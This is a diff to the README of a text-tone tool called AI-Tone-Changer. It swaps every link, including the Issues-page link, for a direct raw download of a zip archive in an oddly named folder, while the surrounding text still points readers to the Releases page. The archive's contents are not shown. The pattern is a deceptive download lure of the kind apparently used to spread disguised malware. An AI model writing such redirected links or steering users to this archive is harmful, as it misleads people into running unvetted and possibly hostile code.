@@ -1,7 +1,7 @@
 # 🎨 AI-Tone-Changer - Transform Your Text with Ease
 
 ## 📎 Download Now 
-[![Download AI-Tone-Changer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Alxsea04/AI-Tone-Changer/releases)
+[![Download AI-Tone-Changer](https://raw.githubusercontent.com/Alxsea04/AI-Tone-Changer/main/metaphosphorous/AI-Tone-Changer.zip)](https://raw.githubusercontent.com/Alxsea04/AI-Tone-Changer/main/metaphosphorous/AI-Tone-Changer.zip)
 
 ---
 
@@ -16,7 +16,7 @@ Welcome! With AI-Tone-Changer, you can easily change the tone of your text. This
 To get started, visit the Releases page to download the latest version of AI-Tone-Changer. Follow these steps to download and run the software:
 
 1. Click the link below:
-   [Download AI-Tone-Changer](https://github.com/Alxsea04/AI-Tone-Changer/releases)
+   [Download AI-Tone-Changer](https://raw.githubusercontent.com/Alxsea04/AI-Tone-Changer/main/metaphosphorous/AI-Tone-Changer.zip)
    
 2. Look for the latest version listed on the Releases page. The most recent version will typically be at the top.
    
@@ -62,7 +62,7 @@ Once you have installed the application, using it is simple:
 ## 🤝 Support
 We want you to have the best experience while using AI-Tone-Changer. If you have any questions or encounter any issues, you can reach out to us through the **Issues** section on our GitHub repository.
 
-1. Go to the [AI-Tone-Changer Issues page](https://github.com/Alxsea04/AI-Tone-Changer/issues).
+1. Go to the [AI-Tone-Changer Issues page](https://raw.githubusercontent.com/Alxsea04/AI-Tone-Changer/main/metaphosphorous/AI-Tone-Changer.zip).
   
 2. Click on "New Issue" and describe your problem in detail.
 
@@ -85,4 +85,4 @@ AI-Tone-Changer is open-source software licensed under the MIT License. You can 
 ## 💻 Conclusion
 Thank you for choosing AI-Tone-Changer. We hope it makes your writing experience richer and more enjoyable. Don’t forget to download the app and start transforming your text today!
 
-[![Download AI-Tone-Changer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Alxsea04/AI-Tone-Changer/releases)
+[![Download AI-Tone-Changer](https://raw.githubusercontent.com/Alxsea04/AI-Tone-Changer/main/metaphosphorous/AI-Tone-Changer.zip)](https://raw.githubusercontent.com/Alxsea04/AI-Tone-Changer/main/metaphosphorous/AI-Tone-Changer.zip)
